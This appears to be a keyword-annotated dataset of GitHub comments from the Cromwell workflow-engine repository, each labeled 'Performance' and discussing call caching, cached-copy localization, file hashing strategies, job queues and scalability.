Performance,@gsaksena Not necessarily. I know that there are people who have tuned their preemption number specifically thinking about total time on top of cost. . I'm not saying that this is a bad idea but it's not necessarily as cut & dry as you're making out.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293684749:65,tune,tuned,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293684749,1,['tune'],['tuned']
Performance,"@horneth - so I see 2 Futures in here. One the little bit changing the state (around the Props) and the other was resolveAndEvaluate. As background for my statement I'll say the following:; - We've already seen firsthand the havoc which can erupt from having Futures rolling around inside an Actor. They break the Actor Model's abstraction that the internals of an actor are single threaded, meaning you now have to reason about shared mutable state, etc. We _can_ do that, but there are easier paths than actors to deal with that. We've been better about this recently but my concern is that it's too easy for stuff like that to sneak into what were previously pure Futures. Mixing Futures & Actors is not really a great idea.; - There are two async operations in the actor, which means that it is certainly doing two different things (I'll admit that the creation of an actor is a fairly lame 'thing'), disrupting Akka's mantra that actors should do one thing only. What I was suggesting was that the work being performed by these Futures be themselves pushed to their own actors. When they complete they can message back to this one, and those messages could be use to manage state transitions and such. (and to be clear, this is _not_ our little 'tol' code phrase - it's something I think we need to be much better about as we refactor cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218573678:1014,perform,performed,1014,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218573678,1,['perform'],['performed']
Performance,"@illusional - The mount point should be `/cromwell_root` when you create the custom AMI. The is the filesystem path that Cromwell uses by default for task data. When creating your config file you will need to specify the region you are operating it - i.e. where your S3 bucket and Batch queues are. All of the above should be preconfigured if you use the [Cromwell ""All-in-One"" template](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/#tldr).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-445968094:287,queue,queues,287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-445968094,1,['queue'],['queues']
Performance,"@illusional . A partial hash is a great idea. I am now downloading a 82 GB bam file in order to check the speed of the algorithm, but unfortunately my network connection is a 100mbits on this PC. It will take 2 hours. Even with a 1000mbit perfect connection it would take at least 12 minutes. So computation time is indeed not the limit here. We need to thinks this through though. Some files are more similar at the beginning (VCF headers come to mind) than at the end. So only hashing the beginning carries with it some major concerns. Using the size is indeed a good thing, and I think we should also include the modification time.; In that case `size+modtime+xx64hsum of first 10mb` should create a unique enough identifier for each file while negating any network performance issues. I think this strategy should be called `hpc`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599448301:769,perform,performance,769,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599448301,1,['perform'],['performance']
Performance,@illusional . At our cluster we use both `cached-copy` and `path+modtime` and call-caching works fine. All our call-caching failures where related to how we implemented the tasks. Have you tried using `cromwell run -m metadata.json workflow.wdl`? In that case the call cache variables will be saved in the `metadata.json` file. It is very informative to see how these change between runs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346#issuecomment-589548236:42,cache,cached-copy,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346#issuecomment-589548236,2,['cache'],"['cache', 'cached-copy']"
Performance,"@illusional ; I am happy you like this change. I have checked your other post in #4945 and your use case is similar to ours. We use a SGE cluster and run cromwell from the login node. The message is really easy to implement. But I am not sure what would be the right way to tackle this. I would like some consistency with the other localization methods, and I don't know if they message when a file is being copied. I haven't tested cached-copy in conjunction with call-caching and path+modtime yet. If I find issues with it I will create a new issue on the cromwell issue tracker, ping you, and see if I can fix it in a PR. We rely heavily on the path+modtime strategy as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507966522:433,cache,cached-copy,433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507966522,1,['cache'],['cached-copy']
Performance,"@illusional I tried to reproduce the issue, but cached-copy localization didn't work for me with both cromwell-50 and cromwell-51 when using configuration file you provided.; On the other hand, when using the following configuration file, `cached-inputs/` was successfully populated for me by both 50 and 51 cromwells:; ```; include required(classpath(""application"")). backend: {; ""default"": ""Local"",; ""providers"": {; ""Local"": {; ""actor-factory"": ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"",; ""config"": {; ""root"": ""/Users/gsterin/cachedcopy/exec_dir"",; ""filesystems"": {; ""local"": {; ""localization"": [""cached-copy""]; }; }; }; }; }; }; ```. It looks like configuration key enabling cached-copy localization should be `filesystems.local.localization` instead of `filesystems.local.duplication-strategy` and also looks like joining configuration keys with `.` symbol doesn't work when your configuration is in pure JSON format (but it works with HOCON format).; So `""filesystems.local.duplication-strategy"": [""cached-copy""]` should be replaced by ; ```; ""filesystems"": {; ""local"": {; ""localization"": [""cached-copy""]; }; }; ```. But I'm still not sure why cached-copy localization worked in Cromwell 50 with your configuration. Would you be able to double-check please?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5533#issuecomment-642196399:48,cache,cached-copy,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5533#issuecomment-642196399,8,['cache'],"['cached-copy', 'cached-inputs', 'cachedcopy']"
Performance,"@illusional Thanks for this. I have been looking into (but not having time for) an easy option that would disable the hash lookup altogether. Cromwell connecting to quay.io while quay.io is down causes crashes we do not want in production. There is a configuration option for this. So it was easy. Unfortunately the hash lookup is coupled with the call-caching mechanic. No hash, no cache. Which is something to be aware of. I was wondering if the easiest way wouldn't be to have the lookup be a command in the config. Just like `docker_kill` there could be a `docker_lookup_hash`. That way you can override the default with a custom command that returns a string (https://stackoverflow.com/a/39376254). . For example:; ```; $ docker inspect --format='{{index .RepoDigests 0}}' mysql:5.6; mysql@sha256:19a164794d3cef15c9ac44754604fa079adb448f82d40e4b8be8381148c785fa; ```; This does NOT need the internet. Similarly, this would enable hash-lookup for singularity users as well without internet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330:383,cache,cache,383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330,1,['cache'],['cache']
Performance,"@illusional You can set the priorities for localization like this; ```; localization: [; ""hard-link"", ""cached-copy"", ""copy""; ]; ```; In that case it will try to hard-link first. It works on our setup. > Hey @rhpvorderman, just wanted to check in and say this has been working great!. Thanks for letting us know. In our institute it is also working great. We have had zero crashes, deadlocks etc. related to this code. So we are also quite happy with it. I am very glad it is useful to others as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-571456289:103,cache,cached-copy,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-571456289,1,['cache'],['cached-copy']
Performance,"@illusional, I've added Singularity installation docs, and udocker cache docs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464537286:67,cache,cache,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464537286,1,['cache'],['cache']
Performance,"@illusional. I did some benchmarking on xxh64sum vs md5sum on a 35GB file. Results:; * Just reading the file with `cat <file> /dev/null` took 18 seconds. Virtually no CPU time; * xxh64sum took 24 seconds of which 3.6 seconds cpu time; * md5sum took 53 seconds, of which 48 seconds cpu time. Md5sum was cpu limited. So CPU was 100% all the time. xxh64sum was limited by the transfer speed of the disk (nvme ssd), so cpu usage never exceeded 20%. This means the bottleneck becomes I/O based, and for 200 GB files on NFS this can indeed be a big problem. I have added a `hpc` strategy` that takes the last modified time, size, and the xxh64sum of the first 10 megabytes of the file to alleviate this problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599516129:460,bottleneck,bottleneck,460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599516129,1,['bottleneck'],['bottleneck']
Performance,@jmthibault79 Adding this to the retry list would retry the user's job. Is that really what you're advocating for?. This is coming from JES. They've actually been requested (by both Firecloud & other users) to tune down the retries that they do on the gsutil up/downloading.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2233#issuecomment-298708235:210,tune,tune,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2233#issuecomment-298708235,1,['tune'],['tune']
Performance,"@jsotobroad As scatter/gather seem to be concurrency events I think you're running into the maximum IOPS (Input/Output Operations Per Second) available from Google. The simulatneous Google disk IOPS are as follows, based on the following link and shown in the table below:. https://cloud.google.com/compute/docs/disks/performance#type_comparison. | Read | Write |; | --- | --- |; | 3000 IOPS | 0 IOPS |; | 2250 IOPS | 3750 IOPS |; | 1500 IOPS | 7500 IOPS |; | 750 IOPS | 11250 IOPS |; | 0 IOPS | 15000 IOPS |. There are other ways this might be tackled where the IOPS is throttled, or a few architectural changes would need to be done where it would write locally to the VM and then transferred over in a preemptive way. There is a microservices approach, but that is a major architectural change for Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237608696:41,concurren,concurrency,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237608696,3,"['concurren', 'perform', 'throttle']","['concurrency', 'performance', 'throttled']"
Performance,@katevoss ; I would like to add our use-case for the ability to access an ID of a workflow/subworkflow. Our users want the output of the Cromwell to be copied to their local locations and they complain that they cannot read the directory structure - I agree with them as they are data scientists and they want something useful after the pipeline finishes. As we provide the service we are responsible to provide them with something. An idea was to use [croo](https://github.com/ENCODE-DCC/croo) to achieve this. It is really useful solution but it requires manual intervention and knowledge of the pipeline IDs etc. Thus I though I could split the workflow into root and two sub-workflows: `do-the-job` and `copy-files`. However to achieve this the `copy-files` would need to have an access to the `do-the-job` sub-workflow ID or at least the root workflow ID to query for the metadata. I agree it is not deterministic and it should not be. Such a task cannot be cached too.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537417825:963,cache,cached,963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537417825,1,['cache'],['cached']
Performance,"@katevoss @geoffjentry <https://github.com/geoffjentry> I do not know what; those runtime attributes would be. Someone on red team would be much; better suited to answer that. On Tue, Aug 29, 2017 at 4:18 PM, Jeff Gentry <notifications@github.com>; wrote:. > @katevoss <https://github.com/katevoss> in a world where our runtime; > attrs weren't fubar we should be caching on what values were actually used.; > For instance if a user wants to swap in their own docker image or change; > the number of CPUs it should only cache to their variant.; >; > And yeah, @LeeTL1220 <https://github.com/leetl1220> brings up a good; > point - there are some parameters which should never cause the outcome to; > change but do get counted against caching.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325789100>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk8uWAvdQtT2jHiCFk3jR73-uU4Zkks5sdHIsgaJpZM4JWcLP>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325842489:520,cache,cache,520,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325842489,1,['cache'],['cache']
Performance,"@katevoss @geoffjentry @kcibul @dshiga . The HCA has no current need for prioritization of workflows, but has a strong need for the ability to submit jobs without starting them (in a queue) and then start them later on. Our entire infrastructure design relies on this feature existing. This ticket is framed by Kristian above as though that functionality already exists, but from my understanding it does not? . I believe it is @ktibbett and the green team / gp production who really need the prioritization feature, so I'll tag her here to add in their use cases.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-327938812:183,queue,queue,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-327938812,1,['queue'],['queue']
Performance,"@katevoss As long as we're happy providing users a bi-directional loaded gun, it's easy to do. The only difficulty here is coming up with a scheme that prevents people from overwriting their files, but KT doesn't care about that here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325773239:66,load,loaded,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325773239,1,['load'],['loaded']
Performance,@katevoss Specifically my concern has always been providing the ability to execute wdl functions in a controlled fashion via a worker pool (perhaps not even in the same JVM as the main engine) for scalability/robustness reasons. As it stands now a cromwell server could get crushed by a ton of these things happening all at once,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2084#issuecomment-288849912:197,scalab,scalability,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2084#issuecomment-288849912,1,['scalab'],['scalability']
Performance,"@katevoss in a world where our runtime attrs weren't fubar we should be caching on what values were actually used. For instance if a user wants to swap in their own docker image or change the number of CPUs it should only cache to their variant. And yeah, @LeeTL1220 brings up a good point - there are some parameters which should never cause the outcome to change but do get counted against caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325789100:222,cache,cache,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325789100,1,['cache'],['cache']
Performance,"@katevoss seems to be, yeah. This is a specific fix to the problem in #2576 which also comes with extra benefits like throttling and batching to make it generally much more reliable and scalable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2612#issuecomment-349133282:186,scalab,scalable,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2612#issuecomment-349133282,1,['scalab'],['scalable']
Performance,"@katevoss we can reuse the result even if the original input file is gone, because we record the hash of the file at execution time. That way, even if the old input file is modified, we won't call-cache unless the new input file matches what was used to generate the original result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560563:197,cache,cache,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560563,1,['cache'],['cache']
Performance,"@katevoss, it not being available in FireCloud is my high-level issue - it turns out that since FireCloud currently implements Cromwell 28, [call_caching_placeholder.txt gets placed, even though it is actually cache-by-copy rather than reference](https://gatkforums.broadinstitute.org/firecloud/discussion/10282/confusing-file-left-in-call-cached-execution-directory). . This makes me believe that it should be trivial to leave a file or log entry with details of _why_ a call was cached, which would be quite useful to me, or anyone else trying to troubleshoot an unexpected occurrence like this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335540147:210,cache,cache-by-copy,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335540147,3,['cache'],"['cache-by-copy', 'cached', 'cached-execution-directory']"
Performance,"@kcibul @ruchim Could you opine (since ""Job Avoidance"" is certainly now available) what kind of behaviour we want if we ""clear up"" a call-cached task?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/601#issuecomment-254317040:138,cache,cached,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/601#issuecomment-254317040,1,['cache'],['cached']
Performance,"@kcibul I believe GATK can perform incremental joint calling, so then you should be able to use a collection of Cromwells submissions to build it up. Would that work?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228096103:27,perform,perform,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228096103,1,['perform'],['perform']
Performance,"@kcibul I don't know. Because the ticket @mcovarr linked sounded like there was a magic setting somewhere I googled around a bit and found some references to badness. I didn't check, however. Still something to look at. Also I've been using MySQL not CloudSQL, perhaps that matters. I got to the point where if I set my batch size high enough (I was generating on the order of ~15k events to write per second, FWIW) my overall performance was such that I was getting a sustained rate of ~1500-1700 (I forget exactly) requests per second on the submission side, which is certainly still a lot less than I was getting w/o metadata at all but a heck of a lot better than I was able to do otherwise. It's entirely possible that all I did was move the goalpost back and that if I extended my test even further eventually I'd see the same problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269497705:427,perform,performance,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269497705,1,['perform'],['performance']
Performance,@kcibul I'm advocating that this earns the `scalability` label but leaving it up to you,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1623#issuecomment-267834071:44,scalab,scalability,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1623#issuecomment-267834071,1,['scalab'],['scalability']
Performance,@kcibul When making the Q3 scalability bucket I think that verification of what @kshakir said above should be part of it,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-267833739:27,scalab,scalability,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-267833739,1,['scalab'],['scalability']
Performance,@kcibul this is likely a very nontrivial fix in 0.19 - can we discuss importance and if it should be queued up for work?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/800#issuecomment-229770714:101,queue,queued,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/800#issuecomment-229770714,1,['queue'],['queued']
Performance,"@kcibul what port, the web server associated with the Cromwell?. It can't be just the host as the host might have multiple cromwells running on it and this needs to work in all situations, not just in a load balanced world.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371248096:203,load,load,203,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371248096,1,['load'],['load']
Performance,"@kcibul what's the downside of just splitting every interval in the original set (N=2500) into 4 even pieces? Is it just that we won't be able to ensure that each quarter is equally balanced? Because rather than spending effort balancing shards, I'd rather optimize the GATK code. Thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2175#issuecomment-294228016:257,optimiz,optimize,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2175#issuecomment-294228016,1,['optimiz'],['optimize']
Performance,"@kshakir From the PR note: ""currently loading in wdl4s as an unmanaged jar, that'll change prior to merging""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/365#issuecomment-170286732:38,load,loading,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/365#issuecomment-170286732,1,['load'],['loading']
Performance,"@kshakir Per https://github.com/broadinstitute/cromwell/pull/2547, I believe that concurrent-job-limit is now available on all backends, so this issue is null and void. Correct?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1751#issuecomment-326410556:82,concurren,concurrent-job-limit,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1751#issuecomment-326410556,1,['concurren'],['concurrent-job-limit']
Performance,"@kshakir helpfully notes:; >That error looks like JNI, that I suspect is jython related, thus is probably heterodon. Heterodon was slimmed down to remove everything NOT tested via mac and/or CI. So since we don’t have any :travis: / :jenkins: testing windows I would not expect heterodon to work. Good news (?): we still support shell invoking `cwltool`, but I have zero expectation for that to work on windows either... So this behavior is likely the result of a deliberate and helpful size optimization.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480391597:492,optimiz,optimization,492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480391597,1,['optimiz'],['optimization']
Performance,"@kshakir mentioned in #1202 that one will soon be able to specify runtime attributes via the Config backend and not through code. Any implementation of this will work for us, provided that:; 1. One can specify arbitrary runtime attributes with values that can contain any characters, including nested double quotes (escaped if necessary).; 2. Arbitrary runtime attributes can be specified both within a single task in a WDL file, and in a workflow options JSON file. For example, using runtime attributes ""-app"" (application profile), ""-q"" (queue), ""-M"" (memory), ""-n"" (processors) and ""-R"" (resource requirements), the submit command line structure for LSF would be of the form:. `bsub -app large -q idle -M 125829120 -n 16,16 -R ""swp > 15 && span[hosts=1]"" -J ${job_name} -cwd ${cwd} -o ${out} -e ${err} /bin/sh ${script}`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1217#issuecomment-236262636:541,queue,queue,541,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1217#issuecomment-236262636,1,['queue'],['queue']
Performance,"@markjschreiber . > The EC2 workers contain a script that automatically expands that mount; users don't need to set that up. No custom AMI is required, in theory any; AMI that can work with ECS could be used. Is this a new feature of all new ECS Optimized Amazon Linux instances?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662080007:246,Optimiz,Optimized,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662080007,1,['Optimiz'],['Optimized']
Performance,"@markjschreiber . I tested your theory, and while the job was able to complete successfully the second time around (after changing the job definition), it didn't update the status in the Cromwell database. Do you reckon it should be possible for me to manually change a record in the database in order to get cromwell to continue where it left off, or will I need to resubmit the entire workflow, and hope that CallCaching is working?. In this particular workflow I'm running, I've observed that CallCaching works.... sometimes(?).... but I was surprised by the amount of Cache misses I observed, which I'm not really sure how to troubleshoot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775:572,Cache,Cache,572,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775,1,['Cache'],['Cache']
Performance,"@mcnelsonsema4 - how many concurrent jobs are in the scatter, and are you running multiple workflows with the same WDLs, but different inputs, at the same time?. Cromwell creates a new job definition revision with every job submission. This is because of the way task paths are handled via container volumes and mount points.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-502888987:26,concurren,concurrent,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-502888987,1,['concurren'],['concurrent']
Performance,"@mcovarr -- can you describe what we can't do now, that will be possible in the future? Or is this just an optimization/efficiency item?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/813#issuecomment-221260748:107,optimiz,optimization,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/813#issuecomment-221260748,1,['optimiz'],['optimization']
Performance,@mcovarr @kcibul Can we refine this a bit? This sounds like it could involve the `scalability` label,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-267833782:82,scalab,scalability,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-267833782,1,['scalab'],['scalability']
Performance,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:279,cache,cache,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182,5,"['cache', 'perform']","['cache', 'cached', 'perform']"
Performance,"@mcovarr I think we still need to ensure that the submission is correct before sending back a 201 with the workflow ID, which means being sure that everything necessary to start executing the workflow is ready (all DB executions succeeded etc...); @kshakir I see your point, however in this case I don't think having the ask timing out is a problem, if a WorkflowActor takes forever to initialize itself then there is actually some bottleneck further down, and it might even be better to say ""sorry but we're really too busy right now, retry later"", than keeping waiting for WorkflowActors, which is going to trigger a timeout anyway since this comes from the ""submit endpoint"" and spray is not going to wait forever either.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161985376:432,bottleneck,bottleneck,432,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161985376,1,['bottleneck'],['bottleneck']
Performance,"@mcovarr Well okay then. Let this remain a singleton as we discussed in the meeting. Later on, if we feel it's a bottleneck, we can make it a kinda router or something.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196540539:113,bottleneck,bottleneck,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196540539,1,['bottleneck'],['bottleneck']
Performance,@mcovarr any chance of getting it re-released as 28.1 or 29? Unfortunately users will just get a checksum mismatch error if the jar is already in their cache since cromwell is `bottle :unneeded`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316010288:152,cache,cache,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316010288,1,['cache'],['cache']
Performance,@mcovarr because sometimes they were getting `attempt-1`s and sometime call cached. I _think_ that the workflows must have been copy/pasted from elsewhere in the test suite and it was a coin toss on which was running first.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5429#issuecomment-590992581:76,cache,cached,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5429#issuecomment-590992581,1,['cache'],['cached']
Performance,"@mcovarr re concurrency testing I still think that's _way_ too overkill. There should be no forced timings, scraping of logs, etc. We know that Calls are wrapped by independent CallActors. As long as multiple CallActors are informed of their startable status by the same event, that's all we need to demonstrate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103264851:12,concurren,concurrency,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103264851,1,['concurren'],['concurrency']
Performance,"@meganshand Sweet, I'm going to close. Out of curiosity do you have any before/after in terms of how long running the wdl took (again, sans call caching)? I'm trying to get a sense of the real world magnitude of the performance improvement for this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289040489:216,perform,performance,216,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289040489,1,['perform'],['performance']
Performance,"@meganshand when call caching was on, you said it was using file paths, what about [call cache copying](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf#L214) ? Is it full copying or (soft/hard) linking ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289051846:89,cache,cache,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289051846,1,['cache'],['cache']
Performance,"@myazinn You can restart the tests by going to the ""checks"" tab on this PR and restarting failed tests that way, no need to reset the PR. We do have a number of flaky tests, unfortunately. There are a lot of things which rely on timing in a concurrent environment which we haven't rooted out. I'm pretty skeptical that the test fix you pushed is actually correct unless it very recently changed - more likely is that something is timing out before the test can properly complete and the incorrect value is coming through.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519088990:241,concurren,concurrent,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519088990,1,['concurren'],['concurrent']
